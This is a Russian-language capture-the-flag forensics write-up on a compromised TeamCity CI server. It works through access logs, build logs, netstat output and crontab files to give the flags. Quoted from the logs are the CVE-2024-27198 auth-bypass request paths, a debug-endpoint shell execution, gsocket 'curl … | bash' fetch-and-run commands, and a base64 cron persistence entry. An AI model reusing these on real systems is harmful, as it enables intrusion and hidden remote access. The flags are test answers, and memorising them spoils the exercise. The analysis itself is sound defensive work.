# CI/CD Compromise


### Легенда

Недавно наши разработчики развернули тестовый сервер во внешнем периметре сети организации, но вскоре ИБ специалистами была зафиксирована подозрительная сетевая активность. Вам предоставлены собранные цифровые артефакты для проведения дальнейшего анализа.

1. Необходимо установить IP-адрес атакующего и дату его первого обращения к скомпрометированному ресурсу.
Формат флага: rdg{127.0.0.1_12/Apr/2023:19:36:54+0000}
2. Необходимо установить уязвимость, использованную злоумышленниками для получения первоначального доступа к информационной системе.
Формат флага: rdg{CVE-20XX-XXXXX}
3. Необходимо определить семейство вспомогательного ПО (указать ссылку на репозиторий проекта), использованного злоумышленниками после получения доступа к информационной системе. Также укажите IP-адрес ресурса, с которым было установлено сетевое соединение после его запуска.
Формат флага: rdg{https://github.com/author/project_127.0.0.1}
4. Необходимо определить способы закрепления злоумышленника в скомпрометированной системе. Ответ необходимо указать в формате MITRE ATT&CK.
Формат флага: rdg{TXXXX.XXX_TYYYY.YYY}

### Решение 

TeamCity — серверное программное обеспечение от компании JetBrains, написанное на языке Java, билд-сервер для обеспечения непрерывной интеграции. 

Предоставленные материалы собраны с рабочей станции под управлением операционной системы Linux. Сервис TeamCity установлен в директории /opt/TeamCity, где вы можете найти все файлы, ассоциированные с данным ПО. Включая файлы журналов. 

Информацию о версии используемого ПО можно найти, например, в журнале /opt/TeamCity/logs/teamcity-mavenServer.log. В нашем случае используется версия 2023.11.3.
```bash
[2025-03-26 22:02:46,499]   INFO - r.maven.remote.MavenServerImpl - Shutting down. Reason [MavenEmbedderFactory shutdown called in thread [TC: 22:02:45 Processing 122 listeners for serverShutdown; 22:02:45 Stage: TeamCity server is shutting down; TeamCity Server (version 2023.11.3 build 147512 started 2025-03-26 21:55:39.753), node id: MAIN_SERVER]] 
```
Посмотрим какие критические уязвимости имеются для данной версии ПО. Например, на сайте https://www.cvedetails.com.

<img width="782" alt="Screen_5" src="https://github.com/user-attachments/assets/32c210de-8ced-495e-9bc7-29187f9f64c9" />

Видим, что самым очевидным кандидатом является уязвимость CVE-2024-27198. Данная уязвимость позволяет злоумышленнику обойти механизм аутентификации для выполнения произвольных действий от лица администратора информационной системы. Также обратим внимание на отметку, что для нее имеется публично доступный эксплойт. Давайте подтвердим данную гипотезу. 

Для эксплутации уязвимости злоумышленнику необходимо отправить специально сформированный POST-запрос на несуществующий ресурс. Пример эндпоинта для создания пользователя:
```bash
/giscyberteam?jsp=/app/rest/users;.jsp
```
Подробное техническое описание уязвимости доступно тут:
- https://www.hackthebox.com/blog/cve-2024-27198-explained
- https://habr.com/ru/articles/802293/

Попробуем поискать приведенные выше шаблоны в журналах. Находим журнал активности веб-сервера access_log.2025-03-26.txt. Проведем поиск по установленным выше подстрокам:
```powershell
> cat .\access_log..2025-03-26.txt | findstr POST | findstr "\/app\/rest\/users"

195.58.34.19 - - [26/Mar/2025:22:13:23 +0000] "POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1" 200 682
195.58.34.19 - - [26/Mar/2025:22:13:24 +0000] "POST /hax?jsp=/app/rest/users/id:11/tokens/EqQzGSWlOY;.jsp HTTP/1.1" 200 236
195.58.34.19 - - [26/Mar/2025:22:13:44 +0000] "POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1" 200 682
195.58.34.19 - - [26/Mar/2025:22:13:44 +0000] "POST /hax?jsp=/app/rest/users/id:12/tokens/XMocbj2XNk;.jsp HTTP/1.1" 200 236
195.58.34.19 - - [26/Mar/2025:22:13:53 +0000] "POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1" 200 682
195.58.34.19 - - [26/Mar/2025:22:13:53 +0000] "POST /hax?jsp=/app/rest/users/id:13/tokens/pdr2Xm6zTf;.jsp HTTP/1.1" 200 236
195.58.34.19 - - [26/Mar/2025:22:14:01 +0000] "POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1" 200 682
195.58.34.19 - - [26/Mar/2025:22:14:01 +0000] "POST /hax?jsp=/app/rest/users/id:14/tokens/sx83TFTdvN;.jsp HTTP/1.1" 200 236
195.58.34.19 - - [26/Mar/2025:22:14:53 +0000] "POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1" 200 682
195.58.34.19 - - [26/Mar/2025:22:14:53 +0000] "POST /hax?jsp=/app/rest/users/id:15/tokens/7X5KVaoQhm;.jsp HTTP/1.1" 200 236
```
Видим попытки эксплуатации со стороны узла с IP-адресом 195.58.34.19. 
Флаг: rdg{CVE-2024-27198}

Посмотрим самые ранние события, ассоциированные с данным адресом:
```powershell
> cat .\access_log..2025-03-26.txt | findstr "195.58.34.19"

195.58.34.19 - - [26/Mar/2025:22:11:57 +0000] "GET /favorite/projects?__fragmentId=globalHealthItemsInner HTTP/1.1" 200 1822
195.58.34.19 - - [26/Mar/2025:22:11:58 +0000] "GET /favorite/projects?__fragmentId=globalHealthItemsInner HTTP/1.1" 200 1822
195.58.34.19 - - [26/Mar/2025:22:13:23 +0000] "POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1" 200 682
195.58.34.19 - - [26/Mar/2025:22:13:24 +0000] "POST /hax?jsp=/app/rest/users/id:11/tokens/EqQzGSWlOY;.jsp HTTP/1.1" 200 236
195.58.34.19 - - [26/Mar/2025:22:13:24 +0000] "POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable%3Dtrue HTTP/1.1" 200 -
195.58.34.19 - - [26/Mar/2025:22:13:24 +0000] "POST /app/rest/debug/processes?exePath=/bin/sh&params=-c&params=echo+Ready HTTP/1.1" 404 249
<truncated>
```
Самое ранее событие датировано 26/Mar/2025:22:11:57 +0000. Теперь мы можем сформировать флаг: rdg{195.58.34.19_26/Mar/2025:22:11:57+0000}.

Для выполнения произвольного кода в операционной системе с помощью TeamCity злоумышленники могли воспользоваться несколькими способами. Например, при помощи создания кастомного Runner с типом "Command Line". 

Чуть подробнее про выполнение произвольного кода в TeamCity: https://exploit-notes.hdks.org/exploit/web/teamcity-pentesting/.

Гипотезу можно подтвердить путем ознакомления с журналом сборки проектов:
```powershell
> cat /opt/TeamCity/buildAgent/logs/teamcity-build.log

[2025-03-26 22:22:43,374]   INFO - ----------------------------------------- [ Step 'Command Line' (simpleRunner), Build "Legit / Test" #1 {id=1, buildTypeId='Legit_Test'} ] -----------------------------------------
[2025-03-26 22:22:43,390]   INFO - Starting "/opt/TeamCity/buildAgent/temp/agentTmp/custom_script4562958694573815655 " in directory "/opt/TeamCity/buildAgent/work/2b35ac7e0452d98f"
[2025-03-26 22:22:44,609]   INFO - --> Trying x86_64-alpine
[2025-03-26 22:22:45,109]   INFO - Downloading binaries........................................................[OK]
[2025-03-26 22:22:45,111]   INFO - Unpacking binaries..........................................................[OK]
[2025-03-26 22:22:45,126]   INFO - Copying binaries............................................................[OK]
[2025-03-26 22:22:45,129]   INFO - Testing binaries............................................................[OK]
[2025-03-26 22:22:45,343]   INFO - Testing Global Socket Relay Network.........................................[OK]
[2025-03-26 22:22:45,518]   INFO - Installing access via crontab...............................................[OK]
[2025-03-26 22:22:45,528]   INFO - Installing access via ~/.bashrc.............................................[OK]
[2025-03-26 22:22:45,537]   INFO - Installing access via ~/.profile............................................[OK]
[2025-03-26 22:22:45,542]   INFO - Executing webhooks....................................................[SKIPPING]
[2025-03-26 22:22:45,542]   INFO - --> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/x)"
[2025-03-26 22:22:45,542]   INFO - --> To connect use one of the following:
[2025-03-26 22:22:45,543]   INFO - --> gs-netcat -s "3X4hXfVKsn6V7z1F8UQuDX" -i
[2025-03-26 22:22:45,543]   INFO - --> S="3X4hXfVKsn6V7z1F8UQuDX" bash -c "$(curl -fsSL https://gsocket.io/x)"
[2025-03-26 22:22:45,544]   INFO - --> S="3X4hXfVKsn6V7z1F8UQuDX" bash -c "$(wget -qO- https://gsocket.io/x)"
[2025-03-26 22:22:45,551]   INFO - Starting 'defunct' as hidden process '[mm_percpu_wq]'.......................[OK]
[2025-03-26 22:22:45,552]   INFO - --> Join us on Telegram - https://t.me/thcorg
[2025-03-26 22:22:45,579]   INFO - Process exited with code 0
```
Видим вывод результата установки популярного средства для туннелирования gsocket: https://github.com/hackerschoice/gsocket. Обратим внимание, что данное ПО было запущено как процесс с именем mm_percpu_wq.

Для ответа на вопрос с каким удаленным сервисом было установлено сетевое соединение после запуска gsocket обратимся к предоставленным артефактам. В частности к результату работы утилиты Netstat:
```powershell
> cat .\results\Linux.Network.Netstat.json

<truncated>
{"inode":"148166","State":"Established","uid":"1001","ProcessInfo":{"Pid":7483,"Command":"defunct\n","CommandLine":"[mm_percpu_wq]\u0000","Filename":"socket:[148166]","Type":"socket","Inode":"148166"},"LocalAddr":{"IP":"10.128.0.30","Port":34280},"RemoteAddr":{"IP":"213.171.212.212","Port":443}}
{"inode":"149977","State":"Established","uid":"1001","ProcessInfo":{"Pid":7483,"Command":"defunct\n","CommandLine":"[mm_percpu_wq]\u0000","Filename":"socket:[149977]","Type":"socket","Inode":"149977"},"LocalAddr":{"IP":"10.128.0.30","Port":51410},"RemoteAddr":{"IP":"213.171.212.212","Port":443}}
<truncated>
```

Процесс mm_percpu_wq инициировал несколько сетевых соединение с узлом, имеющим IP-адрес 213.171.212.212.
Флаг: rdg{https://github.com/hackerschoice/gsocket_213.171.212.212}.

Подсказку для определения способов закрепления в системе мы могли видеть в выводе результата работы gsocket:
```powershell
<truncated>
[2025-03-26 22:22:45,518]   INFO - Installing access via crontab...............................................[OK]
[2025-03-26 22:22:45,528]   INFO - Installing access via ~/.bashrc.............................................[OK]
[2025-03-26 22:22:45,537]   INFO - Installing access via ~/.profile............................................[OK]
<truncated>
```
Находим закреп через crontab uploads/auto/var/spool/cron/crontabs/teamcity:
```powershell
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Wed Mar 26 22:22:45 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
0 * * * * { echo L3Vzci9iaW4vcGtpbGwgLTAgLVUxMDAxIGRlZnVuY3QgMj4vZGV2L251bGwgfHwgU0hFTEw9L2Jpbi9iYXNoIFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUvdGVhbWNpdHkvLmNvbmZpZy9odG9wL2RlZnVuY3QuZGF0IC1saXFEIiAvdXNyL2Jpbi9iYXNoIC1jICJleGVjIC1hICdbbW1fcGVyY3B1X3dxXScgJy9ob21lL3RlYW1jaXR5Ly5jb25maWcvaHRvcC9kZWZ1bmN0JyIgMj4vZGV2L251bGwK|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel

```
После декодирования:
```powershell
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Wed Mar 26 22:22:45 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
0 * * * * { /usr/bin/pkill -0 -U1001 defunct 2>/dev/null || SHELL=/bin/bash TERM=xterm-256color GS_ARGS="-k /home/teamcity/.config/htop/defunct.dat -liqD" /usr/bin/bash -c "exec -a '[mm_percpu_wq]' '/home/teamcity/.config/htop/defunct'" 2>/dev/null|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel

```
Данный способ соответствует технике T1053.003 Scheduled Task/Job: Cron матрицы MITRE ATT&CK.

Аналогичные команды можно обнаружить в uploads/file/home/teamcity/.bashrc и uploads/file/home/teamcity/.profile. Данный способ соответствует технике T1546.004 Event Triggered Execution: Unix Shell Configuration Modification матрицы MITRE ATT&CK.

Флаг: rdg{T1053.003_T1546.004}.
